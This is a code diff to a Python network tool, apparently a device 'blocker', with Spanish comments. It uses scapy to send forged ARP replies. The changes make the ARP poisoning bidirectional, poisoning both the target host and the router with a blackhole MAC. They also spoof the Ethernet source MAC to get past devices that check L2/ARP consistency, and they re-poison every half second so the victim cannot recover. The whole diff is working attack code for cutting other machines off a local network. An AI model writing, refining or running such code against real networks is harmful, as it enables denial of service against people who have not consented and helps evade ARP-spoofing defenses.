@@ -33,12 +33,19 @@ _NO_WINDOW = 0x08000000 if _IS_WIN else 0
 BLACKHOLE_MAC = "02:00:00:00:5e:00"
 
 
-def _send_arp(iface=None, **fields):
+def _send_arp(iface=None, ether_src=None, **fields):
     """Envia una respuesta ARP como trama Ethernet unicast (por la interfaz
-    correcta si se indica, para no salir por un adaptador virtual)."""
+    correcta si se indica, para no salir por un adaptador virtual).
+
+    ether_src fuerza la MAC de origen de la trama Ethernet: algunos equipos
+    IGNORAN un ARP si la MAC de origen L2 no coincide con la del propio ARP
+    (hwsrc). Ponerlas iguales hace que el envenenamiento "cuaje"."""
     from scapy.all import ARP, Ether, sendp
     destination = fields.get("hwdst")
-    pkt = Ether(dst=destination) / ARP(**fields)
+    eth = Ether(dst=destination)
+    if ether_src:
+        eth.src = ether_src
+    pkt = eth / ARP(**fields)
     if iface:
         sendp(pkt, iface=iface, verbose=0)
     else:
@@ -321,6 +328,27 @@ class Blocker:
         if not self.gateway_mac:
             raise RuntimeError("No se pudo resolver la MAC del router.")
 
+    def _poison(self, ip, mac):
+        """Envenena en LAS DOS direcciones (agresivo):
+          - al equipo: "el router (gateway_ip) esta en la MAC agujero-negro"
+            -> no puede ENVIAR al router.
+          - al router: "el equipo (ip) esta en la MAC agujero-negro"
+            -> no puede RECIBIR respuestas.
+        La MAC de origen Ethernet se pone igual al agujero negro para que el ARP
+        no lo descarte un equipo que valida la coherencia L2/ARP."""
+        _send_arp(iface=self.iface, ether_src=BLACKHOLE_MAC, op=2,
+                  pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=BLACKHOLE_MAC)
+        _send_arp(iface=self.iface, ether_src=BLACKHOLE_MAC, op=2,
+                  pdst=self.gateway_ip, hwdst=self.gateway_mac,
+                  psrc=ip, hwsrc=BLACKHOLE_MAC)
+
+    def _heal(self, ip, mac):
+        """Restaura las asociaciones ARP correctas en ambos extremos."""
+        _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
+                  psrc=self.gateway_ip, hwsrc=self.gateway_mac)
+        _send_arp(iface=self.iface, op=2, pdst=self.gateway_ip,
+                  hwdst=self.gateway_mac, psrc=ip, hwsrc=mac)
+
     def block(self, ip, mac=None):
         mac = (mac or "").lower() or Interceptor._mac_of(ip)
         if not mac:
@@ -333,12 +361,11 @@ class Blocker:
             atexit.register(self.stop)
         with self._lock:
             self.targets[ip] = mac
-        # rafaga inmediata: el corte se nota al instante, no al siguiente ciclo
+        # rafaga inmediata fuerte: el corte se nota al instante
         try:
-            for _ in range(4):
-                _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
-                          psrc=self.gateway_ip, hwsrc=BLACKHOLE_MAC)
-                time.sleep(0.15)
+            for _ in range(12):
+                self._poison(ip, mac)
+                time.sleep(0.08)
         except Exception:
             pass
         return True
@@ -347,9 +374,11 @@ class Blocker:
         with self._lock:
             mac = self.targets.pop(ip, None)
         if mac and self.gateway_ip and self.gateway_mac:
-            for _ in range(5):
-                _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
-                          psrc=self.gateway_ip, hwsrc=self.gateway_mac)
+            for _ in range(6):
+                try:
+                    self._heal(ip, mac)
+                except Exception:
+                    pass
                 time.sleep(0.2)
         if not self.list_targets():
             self.stop()
@@ -360,16 +389,17 @@ class Blocker:
             return list(self.targets.keys())
 
     def _loop(self):
+        # Re-envenena a alta frecuencia (cada 0.5s) para que el equipo no tenga
+        # ventana de re-resolver la MAC real del router y colarse.
         while self._running:
             with self._lock:
                 items = list(self.targets.items())
             for ip, mac in items:
                 try:
-                    _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
-                              psrc=self.gateway_ip, hwsrc=BLACKHOLE_MAC)
+                    self._poison(ip, mac)
                 except Exception:
                     pass
-            time.sleep(1.2)
+            time.sleep(0.5)
 
     def stop(self):
         self._running = False
@@ -379,14 +409,13 @@ class Blocker:
             items = list(self.targets.items())
             self.targets.clear()
         if self.gateway_ip and self.gateway_mac:
-            try:
-                for ip, mac in items:
-                    for _ in range(5):
-                        _send_arp(iface=self.iface, op=2, pdst=ip, hwdst=mac,
-                                  psrc=self.gateway_ip, hwsrc=self.gateway_mac)
-                        time.sleep(0.1)
-            except Exception:
-                pass
+            for ip, mac in items:
+                for _ in range(6):
+                    try:
+                        self._heal(ip, mac)
+                    except Exception:
+                        pass
+                    time.sleep(0.1)
 
 
 blocker = Blocker()
